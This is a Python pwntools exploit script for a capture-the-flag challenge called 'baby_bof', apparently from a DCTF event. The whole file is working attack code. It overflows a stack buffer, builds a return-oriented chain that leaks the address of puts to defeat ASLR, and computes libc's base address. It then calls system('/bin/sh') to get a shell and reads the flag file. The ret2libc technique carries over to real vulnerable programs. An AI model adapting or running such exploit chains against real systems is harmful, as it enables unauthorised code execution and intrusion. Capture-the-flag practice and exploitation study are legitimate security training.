#!/usr/bin/env python3
import pwn

host = "dctf-chall-baby-bof.westeurope.azurecontainer.io"
port = 7481
target = "baby_bof"


def exploit(remote):
    if remote:
        pr = pwn.connect(host, port)
    else:
        pr = pwn.process(target)

    try:
        elf = pwn.ELF('baby_bof')
        libc = pwn.ELF('libc-2.31.so')
        rop = pwn.ROP(elf)

        pop_rdi = pwn.p64(rop.find_gadget(['pop rdi', 'ret']).address)

        payload = b'A'*18
        payload += pop_rdi
        payload += pwn.p64(elf.got['puts'])
        payload += pwn.p64(elf.plt['puts'])
        payload += pwn.p64(elf.sym['vuln'])

        pr.sendlineafter("me\n", payload)
        print(pr.readline())
        out = pr.readline().strip()
        puts_addr = int.from_bytes(out[:8], 'little')
        print('puts @', hex(puts_addr))

        """Also works
        if remote:
            sys = puts_addr - 0x32190
            bin_sh = puts_addr + 0x13000a
        else:
            sys = puts_addr - 0x2e660
            bin_sh = puts_addr + 0x116eb6
        """

        libc.address = puts_addr - libc.symbols['puts']
        sys = libc.symbols['system']
        bin_sh = next(libc.search(b'/bin/sh'))

        print('sys @', hex(sys))
        print('bin_sh @', hex(bin_sh))

        ret = pwn.p64(rop.find_gadget(['ret']).address)
        payload = b'A'*18
        payload += ret
        payload += pop_rdi
        payload += pwn.p64(bin_sh)
        payload += pwn.p64(sys)
        payload += pwn.p64(elf.sym['vuln'])
        print(payload)

        pr.sendafter('me\n', payload)
        pr.sendline()
        pr.sendline('cat flag.txt')
        print(pr.readall(4))
    except Exception as e:
        print(e)
    finally:
        pr.close()

exploit(False)